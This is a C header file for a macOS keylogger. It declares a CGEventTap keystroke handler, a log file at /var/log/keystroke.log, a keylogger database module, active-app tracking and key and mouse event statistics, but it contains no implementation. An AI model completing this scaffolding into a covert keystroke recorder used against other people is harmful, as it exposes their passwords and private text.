#pragma once
/******************************************************/
#define MY_LOG_LEVEL       LOG_TRACE
/******************************************************/
#ifndef SOCK_MAXADDRLEN
#define SOCK_MAXADDRLEN    255
#endif
#include <assert.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <fnmatch.h>
#include <mach/mach_time.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/proc_info.h>
#include <sys/sysctl.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
/******************************************************/
#include "active-app/active-app.h"
#include "fsio.h"
#include "keylogger-db/keylogger-db.h"
#include "parson/parson.h"
#include "stringbuffer.h"
#include "stringfn.h"
#include "submodules/c_deps/submodules/c_ansi/ansi-codes/ansi-codes.h"
#include "submodules/c_deps/submodules/c_ansi/ansi-utils/ansi-utils.h"
#include "submodules/c_deps/submodules/c_timer/include/c_timer.h"
#include "submodules/c_deps/submodules/timestamp/timestamp.h"
#include "system-utils/system-utils.h"
#include "window-utils/window-utils.h"
/******************************************************/
static FILE *logfile = NULL;
static struct StringBuffer *sb;
/******************************************************/
static const char          logfileLocation[] = "/var/log/keystroke.log";
CGEventRef                 event_handler(CGEventTapProxy, CGEventType, CGEventRef, void *);
static const char *convertKeyboardCode(int);
char *down_keys_csv();

/******************************************************/
typedef struct KeyState {
  unsigned long ts;
  char          *name;
  int           code;
  struct list_t *downkeys;
} KeyState;
static struct KeyState *keystate;
typedef struct DownKey {
  int           keycode;
  unsigned long ts;
} DownKey;
static struct DownKeys *downkey;
typedef struct {
  unsigned long any, key, key_down, key_up, mouse;
} qty_t;
typedef struct {
  unsigned long ts, last, started;
} times_t;
typedef struct {
  unsigned long any, key, key_down, key_up, mouse, last;
} since_t;
typedef struct {
  times_t *times;
  since_t *since;
  qty_t   *qty;
} keylogger_stats_t;
int keylogger_exec();
